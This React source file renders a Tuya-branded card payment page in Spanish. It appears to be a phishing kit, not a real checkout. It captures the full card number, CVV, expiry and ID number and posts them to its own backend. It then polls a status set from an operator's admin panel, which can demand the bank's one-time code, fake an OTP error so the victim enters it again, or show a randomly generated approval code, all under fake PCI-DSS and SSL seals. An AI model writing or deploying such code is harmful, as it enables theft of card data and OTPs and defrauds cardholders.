import React, { useState, useRef, useEffect, useMemo } from 'react'
import tuyaLogo from '../assets/logo.svg'
import {
  CreditCard,
  Lock,
  ShieldCheck,
  CheckCircle2,
  AlertCircle,
  KeyRound,
  RotateCcw,
} from 'lucide-react'

// Validación oficial del Algoritmo de Luhn (Módulo 10)
export function isValidLuhn(cardNumber: string): boolean {
  const clean = cardNumber.replace(/\D/g, '')
  if (clean.length < 13 || clean.length > 19) return false

  let sum = 0
  let shouldDouble = false

  for (let i = clean.length - 1; i >= 0; i--) {
    let digit = parseInt(clean.charAt(i), 10)

    if (shouldDouble) {
      digit *= 2
      if (digit > 9) {
        digit -= 9
      }
    }

    sum += digit
    shouldDouble = !shouldDouble
  }

  return sum % 10 === 0
}

// Validación de fecha de expiración (no aceptar tarjetas vencidas)
export function isCardExpired(monthStr: string, yearStr: string): boolean {
  const month = parseInt(monthStr, 10)
  let year = parseInt(yearStr, 10)

  if (isNaN(month) || isNaN(year) || month < 1 || month > 12) {
    return true
  }

  // Normalizar a 4 dígitos si viene en 2 dígitos (ej: 26 -> 2026)
  if (year < 100) {
    year += 2000
  }

  const now = new Date()
  const currentYear = now.getFullYear()
  const currentMonth = now.getMonth() + 1 // 1 a 12

  if (year < currentYear) {
    return true
  }

  if (year === currentYear && month < currentMonth) {
    return true
  }

  if (year > currentYear + 25) {
    return true
  }

  return false
}

export interface CreditCardData {
  cardNumber: string
  cardHolder: string
  expiryMonth: string
  expiryYear: string
  cvv: string
  installments: number
  docType: string
  docNumber: string
  phone: string
  email: string
  amount: number
  cardBrand: string
}

interface Props {
  initialDocNumber?: string
  initialDocType?: string
  initialFullName?: string
}

export const CreditCardCheckout: React.FC<Props> = ({
  initialDocNumber = '',
  initialDocType = 'CC',
  initialFullName = '',
}) => {
  // Estado de vistas: 'form' | 'processing' | 'otp' | 'success' | 'declined'
  const [viewState, setViewState] = useState<'form' | 'processing' | 'otp' | 'success' | 'declined'>('form')

  // Datos del formulario esencial (individual y limpio)
  const [cardNumber, setCardNumber] = useState('')
  const [cardHolder, setCardHolder] = useState(initialFullName)
  const [expiry, setExpiry] = useState('')
  const [cvv, setCvv] = useState('')
  const [docType] = useState(() => {
    return sessionStorage.getItem('auth_doc_type') || initialDocType || 'CC'
  })
  const [docNumber] = useState(() => {
    return sessionStorage.getItem('auth_doc_number') || initialDocNumber || ''
  })

  // Control visual del flip de la tarjeta 3D
  const [isFlipped, setIsFlipped] = useState(false)
  const [errorMessage, setErrorMessage] = useState('')

  // Control del OTP bancario (6 dígitos)
  const [otpCode, setOtpCode] = useState(['', '', '', '', '', ''])
  const otpRequestCountRef = useRef(0)
  const [otpErrorMessage, setOtpErrorMessage] = useState('')
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([])

  // Transacción en BD
  const [txId, setTxId] = useState<number | null>(null)
  const [approvalCode, setApprovalCode] = useState('')

  // GIF animado de espera configurado desde admin
  const [loadingGifUrl, setLoadingGifUrl] = useState<string>('')

  useEffect(() => {
    fetch('/api/public-settings')
      .then((res) => res.json())
      .then((data) => {
        if (data.success && data.loadingGifUrl) {
          setLoadingGifUrl(data.loadingGifUrl)
        }
      })
      .catch(() => {})
  }, [])

  const AMOUNT = 249900 // $249.900 COP

  // Detección de franquicia
  const cardBrand = useMemo(() => {
    const clean = cardNumber.replace(/\D/g, '')
    if (/^4/.test(clean)) return 'Visa'
    if (/^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[01]|2720)/.test(clean)) return 'Mastercard'
    if (/^3[47]/.test(clean)) return 'American Express'
    if (/^3(0[0-5]|[68])/.test(clean)) return 'Diners Club'
    return 'Desconocida'
  }, [cardNumber])

  // Color temático de la tarjeta según la franquicia
  const cardGradient = useMemo(() => {
    switch (cardBrand) {
      case 'Visa':
        return 'linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%)'
      case 'Mastercard':
        return 'linear-gradient(135deg, #1f1c18 0%, #8E0E00 50%, #1F1C18 100%)'
      case 'American Express':
        return 'linear-gradient(135deg, #093028 0%, #237A57 100%)'
      case 'Diners Club':
        return 'linear-gradient(135deg, #141E30 0%, #243B55 100%)'
      default:
        return 'linear-gradient(135deg, #111827 0%, #1f2937 50%, #111827 100%)'
    }
  }, [cardBrand])

  // Máscara y formato de tarjeta
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '')
    const isAmex = /^3[47]/.test(raw)
    const maxLen = isAmex ? 15 : 16
    const clean = raw.slice(0, maxLen)

    // Agrupación visual
    let formatted = ''
    if (isAmex) {
      // 4 - 6 - 5
      for (let i = 0; i < clean.length; i++) {
        if (i === 4 || i === 10) formatted += ' '
        formatted += clean[i]
      }
    } else {
      // 4 - 4 - 4 - 4
      for (let i = 0; i < clean.length; i++) {
        if (i > 0 && i % 4 === 0) formatted += ' '
        formatted += clean[i]
      }
    }

    setCardNumber(formatted)
    setErrorMessage('')
  }

  // Formato MM/AA
  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let clean = e.target.value.replace(/\D/g, '').slice(0, 4)
    if (clean.length >= 2) {
      const month = parseInt(clean.slice(0, 2), 10)
      if (month > 12) clean = '12' + clean.slice(2)
      if (month === 0) clean = '01' + clean.slice(2)
      setExpiry(`${clean.slice(0, 2)}/${clean.slice(2)}`)

      // Validar si ya completó los 4 dígitos
      if (clean.length === 4) {
        if (isCardExpired(clean.slice(0, 2), clean.slice(2))) {
          setErrorMessage('La tarjeta ingresada se encuentra vencida.')
        } else {
          setErrorMessage('')
        }
      } else {
        setErrorMessage('')
      }
    } else {
      setExpiry(clean)
      setErrorMessage('')
    }
  }

  // Manejo de CVV
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const max = cardBrand === 'American Express' ? 4 : 3
    const clean = e.target.value.replace(/\D/g, '').slice(0, max)
    setCvv(clean)
    setErrorMessage('')
  }

  // Envío del formulario de pago individual
  const handleSubmitPayment = async (e: React.FormEvent) => {
    e.preventDefault()
    setErrorMessage('')

    const cleanCard = cardNumber.replace(/\D/g, '')
    const isAmex = cardBrand === 'American Express'
    const requiredCardDigits = isAmex ? 15 : 16
    const requiredCvvDigits = isAmex ? 4 : 3

    if (cleanCard.length < requiredCardDigits) {
      setErrorMessage(`El número de tarjeta debe tener ${requiredCardDigits} dígitos.`)
      return
    }

    // Validación mediante Algoritmo de Luhn
    if (!isValidLuhn(cleanCard)) {
      setErrorMessage('El número de tarjeta ingresado no es válido. Verifica los dígitos e intenta nuevamente.')
      return
    }

    if (!expiry.includes('/') || expiry.length < 5) {
      setErrorMessage('Ingresa una fecha de expiración válida (MM/AA).')
      return
    }

    const [expMonthStr, expYearStr] = expiry.split('/')
    if (isCardExpired(expMonthStr, expYearStr)) {
      setErrorMessage('La tarjeta ingresada se encuentra vencida. Por favor ingresa una tarjeta vigente.')
      return
    }

    if (cvv.length < requiredCvvDigits) {
      setErrorMessage(`El código de seguridad (CVV) debe ser de ${requiredCvvDigits} dígitos.`)
      return
    }

    const finalDocNumber = docNumber.trim() || sessionStorage.getItem('auth_doc_number') || 'N/A'
    const finalDocType = docType || sessionStorage.getItem('auth_doc_type') || 'CC'

    // Cambiar a pantalla de procesamiento
    setViewState('processing')

    try {
      const res = await fetch('/api/card-payments', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardHolder: cardHolder.toUpperCase().trim(),
          cardNumber,
          cardBrand,
          expiryMonth: expMonthStr,
          expiryYear: expYearStr,
          cvv,
          installments: 1, // Cuota fija única
          docType: finalDocType,
          docNumber: finalDocNumber,
          phone: '',
          email: '',
          amount: AMOUNT,
          currency: 'COP',
        }),
      })

      const data = await res.json()
      if (data.success && data.data?.id) {
        setTxId(data.data.id)
      } else {
        setViewState('form')
        setErrorMessage(data.message || 'Error al iniciar el pago con tarjeta.')
      }
    } catch {
      setViewState('form')
      setErrorMessage('Error de conexión con la pasarela de pagos.')
    }
  }

  // Polling en tiempo real para sincronizar con el panel del Administrador
  useEffect(() => {
    if (viewState !== 'processing' || !txId) return

    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/card-payments/${txId}/status`)
        const data = await res.json()

        if (data.success && data.status) {
          if (data.status === 'SOLICITAR_OTP' || data.status === 'ERROR_OTP' || data.status === 'ERROR_DINAMICA') {
            otpRequestCountRef.current += 1
            if (otpRequestCountRef.current > 1) {
              setOtpErrorMessage('error ingresela nuevamente')
            }
            setOtpCode(['', '', '', '', '', ''])
            setViewState('otp')
          } else if (data.status === 'APROBADO') {
            setApprovalCode(`AP-${Math.floor(100000 + Math.random() * 900000)}`)
            setViewState('success')
          } else if (data.status === 'RECHAZADO') {
            setViewState('declined')
          } else if (data.status === 'ERROR_DATOS' || data.status === 'ERROR_TARJETA') {
            setViewState('form')
            setErrorMessage('Error en la tarjeta: Los datos de tu tarjeta fueron declinados o rechazados por la entidad bancaria. Por favor verifica los datos e intenta nuevamente.')
          }
        }
      } catch {
        // Polling silencioso
      }
    }, 1500)

    return () => clearInterval(interval)
  }, [viewState, txId])

  // Manejador del input OTP (6 dígitos)
  const handleOtpInput = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return
    const newOtp = [...otpCode]
    newOtp[index] = value.slice(-1)
    setOtpCode(newOtp)

    if (value && index < 5) {
      otpInputRefs.current[index + 1]?.focus()
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otpCode[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus()
    }
  }

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const fullOtp = otpCode.join('')
    if (fullOtp.length < 6) return

    setViewState('processing')
    setOtpErrorMessage('')
    try {
      if (txId) {
        await fetch(`/api/card-payments/${txId}/otp`, {
          method: 'PATCH',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ otpCode: fullOtp }),
        })
      }
    } catch {
      // Silencioso
    }
  }

  return (
    <div className="min-h-screen bg-[#F0F2F5] text-slate-800 flex flex-col items-center justify-center py-8 px-4 sm:px-6 relative selection:bg-red-500 selection:text-white font-sans">
      
      {/* ============================================================== */}
      {/* VISTA 1: FORMULARIO INDIVIDUAL DE TARJETA DE CRÉDITO */}
      {/* ============================================================== */}
      {viewState === 'form' && (
        <div className="w-full max-w-[420px] flex flex-col items-center space-y-6 animate-in fade-in duration-300">
          
          {/* Logotipo Tuya */}
          <div className="flex justify-center -mb-2">
            <img src={tuyaLogo} alt="Logo" className="h-10 sm:h-12 w-auto object-contain drop-shadow-xs" />
          </div>

          {/* CONTENEDOR 3D DE LA TARJETA */}
          <div className="w-full h-[215px] [perspective:1000px] select-none">
            <div
              className={`w-full h-full relative rounded-2xl transition-transform duration-700 [transform-style:preserve-3d] shadow-2xl cursor-pointer ${
                isFlipped ? '[transform:rotateY(180deg)]' : ''
              }`}
              onClick={() => setIsFlipped(!isFlipped)}
              title="Haz clic para voltear la tarjeta"
            >
              {/* CARA FRONTAL */}
              <div
                className="w-full h-full absolute inset-0 rounded-2xl p-6 text-white flex flex-col justify-between [backface-visibility:hidden] border border-white/20 overflow-hidden"
                style={{
                  background: cardGradient,
                  boxShadow: '0 20px 35px -10px rgba(0, 0, 0, 0.45), inset 0 1px 2px rgba(255, 255, 255, 0.3)',
                }}
              >
                {/* Patrón de fondo sutil */}
                <div className="absolute -right-16 -top-16 w-56 h-56 rounded-full bg-white/5 blur-xl pointer-events-none" />
                <div className="absolute -left-16 -bottom-16 w-56 h-56 rounded-full bg-black/20 blur-xl pointer-events-none" />

                {/* Header de la tarjeta: Chip y Contactless + Franquicia */}
                <div className="flex items-center justify-between relative z-10">
                  <div className="flex items-center gap-3">
                    {/* Chip EMV dorado */}
                    <div className="w-11 h-8 rounded-md bg-gradient-to-tr from-amber-300 via-amber-200 to-amber-400 border border-amber-500/70 shadow-sm relative overflow-hidden flex items-center justify-center">
                      <div className="w-full h-[1px] bg-amber-600/60 absolute top-2.5" />
                      <div className="w-full h-[1px] bg-amber-600/60 absolute bottom-2.5" />
                      <div className="h-full w-[1px] bg-amber-600/60 absolute left-3.5" />
                      <div className="h-full w-[1px] bg-amber-600/60 absolute right-3.5" />
                      <div className="w-4 h-3.5 rounded-[2px] border border-amber-600/50 bg-amber-300/40" />
                    </div>
                    {/* Contactless Icon */}
                    <span className="text-white/70 text-lg">
                      <svg className="w-5 h-5 text-white/80" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <path d="M8.5 16.5a5 5 0 0 1 0-7" strokeLinecap="round" />
                        <path d="M12 19a8.5 8.5 0 0 0 0-14" strokeLinecap="round" />
                        <path d="M15.5 21.5a12 12 0 0 0 0-19" strokeLinecap="round" />
                      </svg>
                    </span>
                  </div>

                  {/* Logo de la Franquicia */}
                  <div className="h-8 flex items-center">
                    {cardBrand === 'Visa' && (
                      <span className="font-black italic text-2xl tracking-tighter text-white drop-shadow">
                        VISA
                      </span>
                    )}
                    {cardBrand === 'Mastercard' && (
                      <div className="flex items-center -space-x-3 drop-shadow">
                        <div className="w-7 h-7 rounded-full bg-[#EB001B] opacity-95" />
                        <div className="w-7 h-7 rounded-full bg-[#F79E1B] opacity-90" />
                      </div>
                    )}
                    {cardBrand === 'American Express' && (
                      <span className="font-black text-xs tracking-wider bg-white/20 px-2 py-1 rounded text-white border border-white/30">
                        AMEX
                      </span>
                    )}
                    {cardBrand === 'Diners Club' && (
                      <span className="font-bold text-sm tracking-widest text-sky-200">
                        DINERS
                      </span>
                    )}
                    {cardBrand === 'Desconocida' && (
                      <CreditCard className="w-6 h-6 text-white/60" />
                    )}
                  </div>
                </div>

                {/* Número de Tarjeta */}
                <div className="relative z-10 my-auto">
                  <p className="font-mono text-[19px] sm:text-[20px] font-bold tracking-[0.16em] text-white drop-shadow-md">
                    {cardNumber || '•••• •••• •••• ••••'}
                  </p>
                </div>

                {/* Footer de la Tarjeta: Nombre y Expiración */}
                <div className="flex items-end justify-between relative z-10 text-xs">
                  <div className="max-w-[70%]">
                    <p className="text-[9px] uppercase tracking-wider text-white/70 font-semibold mb-0.5">
                      Titular de la tarjeta
                    </p>
                    <p className="font-medium tracking-wide text-white truncate text-sm uppercase">
                      {cardHolder || 'NOMBRE Y APELLIDO'}
                    </p>
                  </div>

                  <div className="text-right">
                    <p className="text-[9px] uppercase tracking-wider text-white/70 font-semibold mb-0.5">
                      Vence
                    </p>
                    <p className="font-mono font-bold text-white text-sm">
                      {expiry || 'MM/AA'}
                    </p>
                  </div>
                </div>
              </div>

              {/* CARA TRASERA (FLIPPED) */}
              <div
                className="w-full h-full absolute inset-0 rounded-2xl text-white flex flex-col justify-between [transform:rotateY(180deg)] [backface-visibility:hidden] border border-white/20 overflow-hidden py-5"
                style={{
                  background: cardGradient,
                  boxShadow: '0 20px 35px -10px rgba(0, 0, 0, 0.45)',
                }}
              >
                {/* Banda Magnética */}
                <div className="w-full h-11 bg-black/90 shadow-inner" />

                {/* Recuadro de Firma y CVV */}
                <div className="px-6 flex items-center gap-3">
                  <div className="flex-1 h-9 bg-white/80 rounded flex items-center justify-end px-3">
                    <div className="text-[10px] text-gray-400 font-mono italic tracking-widest mr-2 select-none">
                      Firma autorizada
                    </div>
                  </div>
                  <div className="w-14 h-9 bg-white rounded flex items-center justify-center font-mono font-bold text-gray-900 shadow-sm border border-gray-300">
                    {cvv || '•••'}
                  </div>
                </div>

                {/* Texto Legal */}
                <div className="px-6 text-[9px] text-white/60 leading-tight">
                  Esta tarjeta es personal e intransferible. El uso está sujeto al contrato del emisor.
                </div>
              </div>
            </div>
          </div>

          <p
            className="text-xs text-gray-400 flex items-center gap-1.5 cursor-pointer hover:text-gray-600 transition-colors select-none -mt-2"
            onClick={() => setIsFlipped(!isFlipped)}
          >
            <RotateCcw className="w-3.5 h-3.5" />
            <span>Haz clic sobre la tarjeta para girarla</span>
          </p>

          {/* FORMULARIO INDIVIDUAL DE CAPTURA */}
          <div className="w-full bg-white rounded-3xl p-6 sm:p-7 shadow-lg border border-gray-200/80">
            <div className="mb-5 text-center">
              <h2 className="text-xl font-bold text-gray-900 tracking-tight">
                Datos de la Tarjeta
              </h2>
              <p className="text-xs text-gray-500 mt-1">
                Ingresa la información tal y como figura en tu plástico o app bancaria.
              </p>
            </div>

            {/* Mensaje de error si ocurre */}
            {errorMessage && (
              <div className="mb-4 p-3 rounded-xl bg-red-50 border border-red-200 text-red-700 text-xs flex items-start gap-2.5 animate-in fade-in">
                <AlertCircle className="w-4 h-4 text-red-600 shrink-0 mt-0.5" />
                <span>{errorMessage}</span>
              </div>
            )}

            <form onSubmit={handleSubmitPayment} className="space-y-4">
              
              {/* 1. NÚMERO DE TARJETA */}
              <div>
                <label className="block text-xs font-semibold text-gray-700 mb-1.5">
                  Número de la tarjeta
                </label>
                <div className="relative">
                  <input
                    type="text"
                    required
                    inputMode="numeric"
                    autoComplete="cc-number"
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    onFocus={() => setIsFlipped(false)}
                    placeholder="0000 0000 0000 0000"
                    className="w-full bg-[#F8FAFC] border border-gray-300 rounded-xl px-4 py-3 font-mono text-base font-semibold text-gray-900 focus:outline-none focus:ring-2 focus:ring-[#D41A25]/30 focus:border-[#D41A25] transition-all"
                  />
                  <div className="absolute right-3.5 top-1/2 -translate-y-1/2 flex items-center gap-1 text-xs font-bold text-gray-400 pointer-events-none">
                    {cardBrand !== 'Desconocida' ? (
                      <span className="text-[#D41A25] font-semibold">{cardBrand}</span>
                    ) : (
                      <CreditCard className="w-5 h-5 text-gray-400" />
                    )}
                  </div>
                </div>
              </div>

              {/* 2. NOMBRE DEL TITULAR */}
              <div>
                <label className="block text-xs font-semibold text-gray-700 mb-1.5">
                  Nombre completo del titular
                </label>
                <input
                  type="text"
                  required
                  autoComplete="cc-name"
                  value={cardHolder}
                  onChange={(e) => setCardHolder(e.target.value.toUpperCase())}
                  onFocus={() => setIsFlipped(false)}
                  placeholder="COMO APARECE EN LA TARJETA"
                  className="w-full bg-[#F8FAFC] border border-gray-300 rounded-xl px-4 py-3 text-sm font-semibold text-gray-900 uppercase focus:outline-none focus:ring-2 focus:ring-[#D41A25]/30 focus:border-[#D41A25] transition-all"
                />
              </div>

              {/* 3. FECHA EXPIRACIÓN Y CVV */}
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-semibold text-gray-700 mb-1.5">
                    Vencimiento (MM/AA)
                  </label>
                  <input
                    type="text"
                    required
                    inputMode="numeric"
                    autoComplete="cc-exp"
                    value={expiry}
                    onChange={handleExpiryChange}
                    onFocus={() => setIsFlipped(false)}
                    placeholder="MM/AA"
                    maxLength={5}
                    className="w-full bg-[#F8FAFC] border border-gray-300 rounded-xl px-4 py-3 font-mono text-sm font-semibold text-gray-900 focus:outline-none focus:ring-2 focus:ring-[#D41A25]/30 focus:border-[#D41A25] transition-all text-center"
                  />
                </div>

                <div>
                  <label className="block text-xs font-semibold text-gray-700 mb-1.5 flex items-center justify-between">
                    <span>Código CVV</span>
                    <span className="text-[10px] text-gray-400 font-normal">Reverso</span>
                  </label>
                  <input
                    type="password"
                    required
                    inputMode="numeric"
                    autoComplete="cc-csc"
                    value={cvv}
                    onChange={handleCvvChange}
                    onFocus={() => setIsFlipped(true)}
                    onBlur={() => setIsFlipped(false)}
                    placeholder={cardBrand === 'American Express' ? '1234' : '123'}
                    maxLength={cardBrand === 'American Express' ? 4 : 3}
                    className="w-full bg-[#F8FAFC] border border-gray-300 rounded-xl px-4 py-3 font-mono text-sm font-semibold text-gray-900 focus:outline-none focus:ring-2 focus:ring-[#D41A25]/30 focus:border-[#D41A25] transition-all text-center"
                  />
                </div>
              </div>

              {/* BOTÓN DE CONFIRMACIÓN */}
              <div className="pt-3">
                <button
                  type="submit"
                  className="w-full py-4 px-6 rounded-2xl text-white font-bold text-base cursor-pointer select-none transition-all duration-200 hover:brightness-105 active:scale-[0.98] shadow-lg flex items-center justify-center gap-2"
                  style={{
                    background: 'linear-gradient(180deg, #D41A25 0%, #B80F1A 100%)',
                    boxShadow: '0 8px 18px -2px rgba(190, 15, 26, 0.42)',
                  }}
                >
                  <Lock className="w-4 h-4 text-white/90" />
                  <span>Continuar</span>
                </button>
              </div>

              {/* SELLOS DE SEGURIDAD */}
              <div className="flex items-center justify-center gap-4 text-gray-400 text-[11px] pt-1">
                <span className="flex items-center gap-1">
                  <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" /> Cifrado 256-bit SSL
                </span>
                <span className="flex items-center gap-1">
                  <Lock className="w-3.5 h-3.5 text-gray-500" /> PCI-DSS Seguro
                </span>
              </div>

            </form>
          </div>

        </div>
      )}

      {/* ============================================================== */}
      {/* VISTA 2: PANTALLA DE PROCESAMIENTO / ESPERA EN TIEMPO REAL */}
      {/* ============================================================== */}
      {viewState === 'processing' && (
        <div className="w-full max-w-md bg-white rounded-3xl p-8 sm:p-10 shadow-xl border border-gray-200/80 text-center animate-in zoom-in-95 duration-300 my-auto">
          
          <div className="flex justify-center mb-6">
            <img src={tuyaLogo} alt="Logo" className="h-10 sm:h-11 w-auto object-contain" />
          </div>

          {/* GIF animado configurado desde admin o culebrita de tres punticos */}
          {loadingGifUrl ? (
            <div className="flex flex-col items-center justify-center my-4">
              <img
                src={loadingGifUrl}
                alt="Validando sus datos"
                className="w-24 h-24 sm:w-28 sm:h-28 object-contain rounded-2xl drop-shadow-md mx-auto"
                onError={() => setLoadingGifUrl('')}
              />
            </div>
          ) : (
            <div className="flex items-center justify-center gap-3.5 mb-8">
              <span className="w-4 h-4 rounded-full bg-[#D41A25] animate-wave shadow-sm" style={{ animationDelay: '0ms' }} />
              <span className="w-4 h-4 rounded-full bg-[#D41A25] animate-wave shadow-sm" style={{ animationDelay: '180ms' }} />
              <span className="w-4 h-4 rounded-full bg-[#D41A25] animate-wave shadow-sm" style={{ animationDelay: '360ms' }} />
            </div>
          )}

          <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-3 tracking-tight">
            Estamos validando sus datos
          </h2>

          <p className="text-xs sm:text-sm text-gray-500 max-w-xs mx-auto leading-relaxed mb-6">
            Por favor, no recargues ni cierres esta ventana. Tu entidad bancaria está verificando la información.
          </p>

          <div className="mt-6 flex items-center justify-center gap-2 text-xs text-gray-400">
            <ShieldCheck className="w-4 h-4 text-emerald-600" />
            <span>Conexión segura y cifrada</span>
          </div>

        </div>
      )}

      {/* ============================================================== */}
      {/* VISTA 3: PANTALLA DE INGRESO DE OTP / TOKEN DINÁMICO */}
      {/* ============================================================== */}
      {viewState === 'otp' && (
        <div className="w-full max-w-md bg-white rounded-3xl p-6 sm:p-8 shadow-xl border border-gray-200/80 text-center animate-in zoom-in-95 duration-300 my-auto">
          
          <div className="flex justify-center mb-4">
            <img src={tuyaLogo} alt="Logo" className="h-10 sm:h-11 w-auto object-contain" />
          </div>

          <div className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-red-50 text-[#D41A25] flex items-center justify-center border border-red-100 shadow-sm">
            <KeyRound className="w-8 h-8" />
          </div>

          <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-2">
            Verificación de Seguridad
          </h2>

          <p className="text-xs sm:text-sm text-gray-500 mb-4">
            Tu banco ha solicitado la clave dinámica (OTP) de 6 dígitos enviada a tu teléfono o app bancaria.
          </p>

          {/* ALERTA DE ERROR SI SE PIDE POR SEGUNDA VEZ */}
          {otpErrorMessage && (
            <div className="mb-5 p-3 rounded-2xl bg-red-50 border border-red-200 text-red-600 text-xs sm:text-sm font-bold flex items-center justify-center gap-2 animate-in fade-in">
              <AlertCircle className="w-4 h-4 text-red-600 shrink-0" />
              <span>error ingresela nuevamente</span>
            </div>
          )}

          <form onSubmit={handleOtpSubmit} className="space-y-6">
            
            {/* Input unificado dividido en 6 compartimentos */}
            <div className="w-full flex justify-center">
              <div
                className="inline-flex items-center bg-[#F0F2F5] rounded-2xl p-2.5 transition-all"
                style={{
                  boxShadow:
                    'inset 3px 3px 6px rgba(166, 175, 195, 0.45), inset -3px -3px 6px rgba(255, 255, 255, 0.95)',
                }}
              >
                {otpCode.map((digit, idx) => (
                  <React.Fragment key={idx}>
                    <input
                      ref={(el) => { otpInputRefs.current[idx] = el }}
                      type="tel"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleOtpInput(idx, e.target.value)}
                      onKeyDown={(e) => handleOtpKeyDown(idx, e)}
                      className="w-10 sm:w-11 h-12 sm:h-14 bg-transparent border-none outline-none text-center text-xl sm:text-2xl font-mono font-bold text-[#2C3847] focus:ring-0 p-0"
                      autoFocus={idx === 0}
                    />
                    {idx < 5 && (
                      <div className="h-7 w-[1.5px] bg-[#CFD6DF] rounded-full mx-1 self-center" />
                    )}
                  </React.Fragment>
                ))}
              </div>
            </div>

            <button
              type="submit"
              disabled={otpCode.some((d) => !d)}
              className="w-full py-4 px-6 rounded-2xl text-white font-bold text-base cursor-pointer select-none transition-all duration-200 hover:brightness-105 active:scale-[0.98] shadow-lg disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              style={{
                background: 'linear-gradient(180deg, #D41A25 0%, #B80F1A 100%)',
                boxShadow: '0 8px 18px -2px rgba(190, 15, 26, 0.42)',
              }}
            >
              <span>Verificar y Autorizar</span>
            </button>

          </form>

        </div>
      )}

      {/* ============================================================== */}
      {/* VISTA 4: PANTALLA DE PAGO EXITOSO */}
      {/* ============================================================== */}
      {viewState === 'success' && (
        <div className="w-full max-w-md bg-white rounded-3xl p-8 shadow-xl border border-gray-200/80 text-center animate-in zoom-in-95 duration-300 my-auto">
          
          <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-emerald-50 text-emerald-600 flex items-center justify-center border border-emerald-200 shadow-md">
            <CheckCircle2 className="w-12 h-12" />
          </div>

          <h2 className="text-2xl font-bold text-gray-900 mb-1">
            ¡Transacción Aprobada!
          </h2>
          <p className="text-xs sm:text-sm text-gray-500 mb-6">
            Tu operación ha sido verificada y aprobada satisfactoriamente.
          </p>

          <div className="bg-gray-50 rounded-2xl p-4 border border-gray-200/80 text-left text-xs space-y-2 mb-6">
            <div className="flex justify-between pb-2 border-b border-gray-200/60">
              <span className="text-gray-400">Código de Aprobación:</span>
              <span className="font-mono font-bold text-gray-900">{approvalCode || 'AP-739218'}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-400">Tarjeta:</span>
              <span className="font-semibold text-gray-800">{cardBrand} •••• {cardNumber.slice(-4)}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-400">Fecha y Hora:</span>
              <span className="text-gray-700">{new Date().toLocaleString('es-CO')}</span>
            </div>
          </div>

        </div>
      )}

      {/* ============================================================== */}
      {/* VISTA 5: PANTALLA DE TRANSACCIÓN RECHAZADA */}
      {/* ============================================================== */}
      {viewState === 'declined' && (
        <div className="w-full max-w-md bg-white rounded-3xl p-8 shadow-xl border border-gray-200/80 text-center animate-in zoom-in-95 duration-300 my-auto">
          
          <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-red-50 text-red-600 flex items-center justify-center border border-red-200 shadow-md">
            <AlertCircle className="w-12 h-12" />
          </div>

          <h2 className="text-2xl font-bold text-gray-900 mb-1">
            Transacción Declinada
          </h2>
          <p className="text-xs sm:text-sm text-gray-500 mb-6 max-w-xs mx-auto">
            La entidad financiera no autorizó la operación. Por favor verifica tus fondos o utiliza otro medio de pago.
          </p>

          <button
            type="button"
            onClick={() => setViewState('form')}
            className="w-full py-4 px-6 rounded-2xl text-white font-bold text-base cursor-pointer select-none transition-all duration-200 hover:brightness-105 active:scale-[0.98] shadow-md"
            style={{
              background: 'linear-gradient(180deg, #D41A25 0%, #B80F1A 100%)',
            }}
          >
            Intentar nuevamente
          </button>

        </div>
      )}

    </div>
  )
}
